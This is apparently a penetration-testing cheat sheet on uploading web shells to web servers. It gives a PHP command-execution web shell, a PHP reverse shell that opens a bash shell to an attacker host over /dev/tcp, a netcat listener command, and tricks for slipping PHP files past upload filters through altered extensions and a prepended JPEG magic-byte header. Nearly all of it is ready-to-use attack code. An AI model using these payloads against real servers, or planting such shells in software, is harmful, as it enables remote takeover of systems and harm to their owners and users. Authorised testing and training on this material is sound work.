# Uploading Web Shells

## File Upload

### Goal:  Upload a file that the webserver will execute \(webshell\).

Make sure the web shell matches the language used by the webserver!

Ex. php web/reverse shell if the webserver uses php, etc. ...

## Basic PHP Shells

### Web Shell

```text
<?php system($_GET['cmd']); ?>
```

### Reverse Shell

```text
<?php echo shell_exec('bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'); ?>
```

\* The reverse shell will be activated by visiting the page it was uploaded to, make sure you have a listener setup to catch the shell it sends:

```text
$ nc -nlvp <LPORT>
```

## Bypassing Upload Restrictions

Try changing around the file extension:

```text
shell.php4
shell.php3
shell.php.test
shell.pHp
etc...
```

Another technique is to add the type identifier or 'Magic Bytes' for a jpg file at the beginning of the file. This will bypass the filter in many cases as they are typically setup to look at either the first few bytes to determine the file type or the file extension.  Once on the server, the php code will still be detected and execute when browsing to the file.

```text
$ python -c'print "\xff\xd8"' >> jpgheader
$ echo "<?php echo shell_exec('bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'); ?>" >> code.php
$ cat jpgheader code.php >> shell.php
```



